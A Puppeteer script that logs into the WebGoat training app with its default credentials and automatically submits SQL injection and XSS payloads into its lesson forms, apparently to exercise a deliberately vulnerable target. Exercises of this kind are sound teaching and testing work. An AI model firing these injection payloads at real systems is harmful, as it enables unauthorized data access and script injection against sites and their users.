const puppeteer = require('puppeteer');

(async () => {
  if (!process.env.BASEURL) {
      console.log('Please specify a base url. E.g. `BASEURL=http://example.org node exercise.js`');
  } else {
    var browser;
    
    if (process.env.DEBUG) {
      browser = await puppeteer.launch({
          headless: false, 
          executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
      });
    } else {
      browser = await puppeteer.launch();
    }

    const page = await browser.newPage()
    page.setDefaultNavigationTimeout(120000) //2 mins

    const pageOptions = {waitUntil: 'domcontentloaded'}
    const selectorOptions = {"timeout": 120000} //2 mins

    const sqliPayload = "Smith' or '98'='98"
    const xxsPayload = "<script>alert('XSS Test')</script>"

    //logging in 
    try {
      //Add error handling here in case the endpoint is not ready.
      await page.goto(process.env.BASEURL + '/login.mvc', pageOptions);
    } catch (error) {
      console.log(error);
      browser.close();
    }

    console.log('Logging in')
    await page.waitForSelector('input#exampleInputEmail1', selectorOptions)
    await page.type('input#exampleInputEmail1', 'webgoat')
    await page.type('input#exampleInputPassword1', 'webgoat')
    await page.waitForSelector('button.btn.btn-large.btn-primary', selectorOptions)
    await page.click('button.btn.btn-large.btn-primary')
    
    await page.waitForTimeout(10000)

    //exercising sqli vulnerability
    console.log('Exercising SQLi')
    await page.goto(process.env.BASEURL  + '/start.mvc#attack/538385464/1100', pageOptions)    
    console.log('Waiting for account_name')
    await page.waitForSelector('input[name="account_name"]', selectorOptions)
    await page.focus('input[name="account_name"]')
    await page.evaluate( () => document.execCommand( 'selectall', false, null ) )
    await page.keyboard.press( 'Delete' )
    await page.keyboard.type( 'John3' )
    await page.waitForSelector('input[name="SUBMIT"]', selectorOptions)
    console.log('Submitting page')
    await page.click('input[name="SUBMIT"]')

    await page.waitForTimeout(10000)

    page.on('dialog', async dialog => {
      console.log(dialog.message());
      await dialog.dismiss();
    });

    //attacking xss vulnerability
    console.log('Exploiting XSS')
    await page.goto(process.env.BASEURL  + '/start.mvc#attack/1406352188/900', pageOptions)
    console.log('Waiting for field1')
    await page.waitForSelector('input[name="field1"]', selectorOptions)
    await page.focus('input[name="field1"]')
    await page.evaluate( () => document.execCommand( 'selectall', false, null ) );
    await page.keyboard.press( 'Delete' );
    await page.keyboard.type(xxsPayload);
    await page.waitForSelector('input[name="SUBMIT"]', selectorOptions)
    await page.click('input[name="SUBMIT"]')

    await page.waitForTimeout(10000)

    //attacking sqli vulnerability
    console.log('Exploiting SQLi')
    await page.goto(process.env.BASEURL  + '/start.mvc#attack/538385464/1100', pageOptions)
    await page.waitForSelector('input[name="account_name"]', selectorOptions)
    await page.focus('input[name="account_name"]')
    await page.evaluate( () => document.execCommand( 'selectall', false, null ) )
    await page.keyboard.press( 'Delete' )
    await page.keyboard.type( sqliPayload )
    await page.waitForSelector('input[name="SUBMIT"]', selectorOptions)
    await page.click('input[name="SUBMIT"]')

    await page.waitForTimeout(10000)

    browser.close()
    console.log('End')
  }
})()
